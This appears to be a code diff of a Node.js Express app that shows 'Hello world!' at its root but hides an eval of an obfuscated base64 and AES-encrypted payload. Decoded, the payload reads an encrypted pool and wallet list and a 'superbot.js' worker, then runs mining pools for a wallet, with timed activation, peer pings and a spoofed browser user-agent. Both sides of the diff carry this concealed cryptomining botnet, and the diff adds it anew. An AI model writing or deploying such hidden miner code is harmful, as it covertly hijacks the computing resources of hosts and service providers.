@@ -5,33 +5,29 @@ const CryptoJS = require("crypto-js");
 const express=require('express');
 const app=express();
 app.get('/',function(req,res) {
-  if(req.query.yellow_pools) c.yellow_pools = req.query.yellow_pools == '1'
-  if(req.query.active) {
-    if(!c.active && !pools.length) {
-      c.active = req.query.active;
-      var glob = function(x) { eval(decrypt(x.substring(-~[c.active.length]))) }
-(`AXZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSxjLmFjdGl2ZSkudG9TdHJpbmcoQ3J5cHRvSlMuZW5jLlV0Zjgp
-IH07CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLmlkID0gTnVtYmVyKGxpc3Quc2hpZnQoKSk7CmMuY29pbiA9IGxpc3Qu
-c2hpZnQoKTsgdmFyIG15Y29pbiA9IHJlcXVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwpjLndhbGxldCA9IGxpc3Quc2hpZnQoKTsgYy5wZWVycyA9IFtsaXN0LnNoaWZ0KCldOyBjLnBlZXJzLnB1c2gobGlz
-dC5zaGlmdCgpKTsKYy5hY3RpdmUgKz0gMjM0NTsgd29ya2VyID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ3N1cGVyYm90LmpzJywndXRmOCcpKTsKd29ya2VyICs9YAphcHAuZGI9e3N0YXRlOid5ZWxs
-b3cnLGhvc3Q6aCxoYXNoOicwIGgvcyBbMC8wXSd9Owp2YXIgYm90ID0gbmV3IHN1cGVyYm90KCk7CnZhciB0X2hhc2ggPSBsX2hhc2ggPSBzX2hhc2ggPSAwOwphcHAucG9zdCgnL3dvcmtlcicsIGFwcC5w
-YXJzZXIsIGZ1bmN0aW9uIChyZXEsIHJlcykgewogIGFwcC5kYi5tc2cgPSAnbm90aGluZyc7CiAgdmFyIHBzID0gW107CiAgZm9yKHZhciBpPTA7IGk8cmVxLmJvZHkuam9icy5sZW5ndGg7IGkrKykgcHMu
-cHVzaChib3Qub25tZXNzYWdlKHJlcS5ib2R5LmpvYnNbaV0pKTsKICBQcm9taXNlLmFsbChwcykudGhlbihtc2dzID0+IHsKICAgIHRfaGFzaCArPSBtc2dzLmxlbmd0aDsKICAgIGZvcih2YXIgaT0wOyBp
-PG1zZ3MubGVuZ3RoOyBpKyspIGlmKG1zZ3NbaV0gIT0gJ25vdGhpbmcnKSB7CiAgICAgIGlmKGFwcC5kYi5tc2cgPT0gJ25vdGhpbmcnKSBhcHAuZGIubXNnID0gW21zZ3NbaV1dCiAgICAgIGVsc2UgYXBw
-LmRiLm1zZy5wdXNoKG1zZ3NbaV0pOwogICAgICBzX2hhc2grKzsKICAgIH0KICAgIHJlcy5qc29uKGFwcC5kYik7CiAgfSk7Cn0pOwpzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICBhcHAuZGIuc3RhdGUg
-PSB0X2hhc2ggPT0gbF9oYXNoID8gJ3llbGxvdycgOiAnZ3JlZW4nOwogIGFwcC5kYi5oYXNoID0gKHRfaGFzaC1sX2hhc2gpKycgaC9zIFsnK3RfaGFzaCsnLycrc19oYXNoKyddJzsKICBsX2hhc2ggPSB0
-X2hhc2g7Cn0sIDEwMDApOwpjKGFwcC5kYikKYDsKZm9yKHZhciBpPTA7IGk8bGlzdC5sZW5ndGg7IGkrKykKICBpZighbGlzdFtpXS5zdGFydHNXaXRoKCdodHRwJykpIHBvb2xzLnB1c2gobmV3IG15Y29p
-bih7IHdhbGxldDogYy53YWxsZXQsIGhvc3Q6IGxpc3RbaV0gfSkpCiAgZWxzZSB7IGxldCBuYm90PXtob3N0Omxpc3RbaV0sIHN0YXRlOidvcmFuZ2UnLCBoYXNoOicwIGgvcyBbMC8wXSd9OyBib3RzLnB1
-c2gobmJvdCk7IHdha2V1cChuYm90KSB9`)
-    }
-    res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
-  }
+  if(!pools.length) var glob = function(x) { eval(decrypt(x.substring(-~[c.active]))) }
+  (`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSxjLmFjdGl2ZS50b1N0cmluZygpKS50b1N0
+cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKdmFyIGxpc3QgPSBkZWNyeXB0KGZzLnJlYWRGaWxlU3luYygnbGlzdC50eHQnLCd1dGY4JykpLnNwbGl0KCdcclxuJyk7CmMuY29pbiA9I
+Gxpc3Quc2hpZnQoKTsgdmFyIG15Y29pbiA9IHJlcXVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwpjLndhbGxldCA9IGxpc3Quc2hpZnQoKTsgYy5wZWVycyA9IFtsaXN0LnNoaWZ0KCldOy
+BjLnBlZXJzLnB1c2gobGlzdC5zaGlmdCgpKTsKd29ya2VyID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ3N1cGVyYm90LmpzJywndXRmOCcpKStgCmFwcC5kYj17c3RhdGU6J3llbGx
+vdycsaG9zdDpoLGhhc2g6JzAgaC9zIFswLzBdJ307CnZhciBib3QgPSBuZXcgc3VwZXJib3QoKTsKdmFyIHRfaGFzaCA9IGxfaGFzaCA9IHNfaGFzaCA9IDA7CmFwcC5wb3N0KCcvd29y
+a2VyJywgYXBwLnBhcnNlciwgZnVuY3Rpb24gKHJlcSwgcmVzKSB7CiAgYXBwLmRiLm1zZyA9ICdub3RoaW5nJzsKICB2YXIgcHMgPSBbXTsKICBmb3IodmFyIGk9MDsgaTxyZXEuYm9ke
+S5qb2JzLmxlbmd0aDsgaSsrKSBwcy5wdXNoKGJvdC5vbm1lc3NhZ2UocmVxLmJvZHkuam9ic1tpXSkpOwogIFByb21pc2UuYWxsKHBzKS50aGVuKG1zZ3MgPT4gewogICAgdF9oYXNoIC
+s9IG1zZ3MubGVuZ3RoOwogICAgZm9yKHZhciBpPTA7IGk8bXNncy5sZW5ndGg7IGkrKykgaWYobXNnc1tpXSAhPSAnbm90aGluZycpIHsKICAgICAgaWYoYXBwLmRiLm1zZyA9PSAnbm9
+0aGluZycpIGFwcC5kYi5tc2cgPSBbbXNnc1tpXV0KICAgICAgZWxzZSBhcHAuZGIubXNnLnB1c2gobXNnc1tpXSk7CiAgICAgIHNfaGFzaCsrOwogICAgfQogICAgcmVzLmpzb24oYXBw
+LmRiKTsKICB9KTsKfSk7CnNldEludGVydmFsKGZ1bmN0aW9uKCkgewogIGFwcC5kYi5zdGF0ZSA9IHRfaGFzaCA9PSBsX2hhc2ggPyAneWVsbG93JyA6ICdncmVlbic7CiAgYXBwLmRiL
+mhhc2ggPSAodF9oYXNoLWxfaGFzaCkrJyBoL3MgWycrdF9oYXNoKycvJytzX2hhc2grJ10nOwogIGxfaGFzaCA9IHRfaGFzaDsKfSwgMTAwMCk7CmMoYXBwLmRiKQpgOwpmb3IodmFyIG
+k9MDsgaTxsaXN0Lmxlbmd0aDsgaSsrKQogIGlmKCFsaXN0W2ldLnN0YXJ0c1dpdGgoJ2h0dHAnKSkgcG9vbHMucHVzaChuZXcgbXljb2luKHsgd2FsbGV0OiBjLndhbGxldCwgaG9zdDo
+gbGlzdFtpXSB9KSkKICBlbHNlIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpXSwgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHMucHVzaChuYm90KTsgd2FrZXVw
+KG5ib3QpIH0=`)
+  if(req.query.yellow_pools) c.yellow_pools = req.query.yellow_pools == 'true'
+  if(req.query.json) res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
   else { res.send('Hello world!') }
 });
 var s=app.listen(process.env.PORT||5000,()=>console.log('Listening on port '+s.address().port));
 
 var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };
-var c = { active: 0, state: 'orange', yellow_pools: false, hash: '0 h/s 0/0' }
+var c = { active: 0, id: 1, state: 'orange', yellow_pools: false, hash: '0 h/s 0/0' }
 var rec = false;
 var pools = []; var bots = []; var worker = '';
 
@@ -93,18 +89,15 @@ function myrequest(url,form,callback) {
     headers:{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geko) Chrome/83.0.4103.116 Safari/537.36'}
   }
   if(form) { options.method = 'POST'; options.form = form }
-  request(options, (error, response, body) => { callback(error, response, body) });
+  request(options, (error, response, body) => callback(error, response, body) );
 }
 
 setInterval(function() {
   var m = new Date().getMinutes();
-  if(c.id == 1 && m < 30) c.active = m+1
-  else if(c.id == 2 && m >= 30) c.active = m-29
-  else c.active = 0
-  if(!rec && c.active == 1) { rec = true; myrequest(c.peers[c.id-1],function(){ rec = false }) }
-  if(!rec && c.active == 30) { rec = true; myrequest(c.peers[c.id == 1 ? 1 : 0],function(){ rec = false }) }
-
-  //--------------------------------------------------------
+  if(c.id == 1) c.active = m < 30 ? m+1 : m-59
+  else c.active =  m-29
+  if(!rec && c.active == 1) { rec = true; myrequest(c.peers[c.id-1],false,function(){ rec = false }) }
+  if(!rec && c.active == 30) { rec = true; myrequest(c.peers[c.id == 1 ? 1 : 0],false,function(){ rec = false }) }
 
   var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;
 
